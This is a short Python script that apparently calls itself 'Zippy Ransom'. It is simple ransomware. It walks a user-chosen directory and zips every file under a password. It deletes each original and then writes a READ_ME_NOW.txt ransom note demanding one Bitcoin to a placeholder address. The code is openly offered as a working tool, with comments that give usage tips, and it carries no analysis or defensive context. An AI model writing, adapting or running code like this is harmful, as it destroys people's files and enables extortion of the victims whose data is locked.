import os, sys, pyminizip, getpass    
import pyfiglet

def banner():
    ascii_banner = pyfiglet.figlet_format("Zippy Ransom - Zipper")
    print(ascii_banner)


def create_ransome_note():
    # create ransom note in the current directory
    note = open("READ_ME_NOW.txt", "w")
    bitcoin_address = "<ENETR YOUR PUBLIC BITCOIN ADDRESS HERE>"
    note.write("The current file path has been zipped and encrypted, send 1 Bitcoin to the following address to receive to decryption key: {}".format(bitcoin_address))
    note.close()
    print("Ransome note has been created!")

def main():
    try:
        # provide path (BE CAREFUL!!!)
        path = input("Enter path to zip: ")

        if not os.path.exists(path):
            raise Exception("Path does not exits")

        # get password from user (REMEMBER YOUR PASSWORD!!!)
        passwd = getpass.getpass()

        # ensure password is not blank
        if passwd == "" or passwd.strip() == "":
            raise Exception("Password cannot be empty")

        # iterate through dictories starting with the path given
        for root, dirs, files in os.walk(path, topdown=False):
            try:
                for name in files:
                    inpt = os.path.join(root, name)
                    print(inpt)

                    # name file
                    ouput = inpt + ".zip"
                    
                    # compress level
                    com_lvl = 5
                    
                    # compressing file
                    pyminizip.compress(inpt, None, ouput,
                                    passwd, com_lvl)

                    # delete original file
                    os.remove(inpt) 

            except Exception as e:
                print(e)
                continue


        print("Files has been zipped!")
        create_ransome_note()

    except Exception as e:
        sys.exit(e)
    
if __name__=="__main__":
    banner()
    main()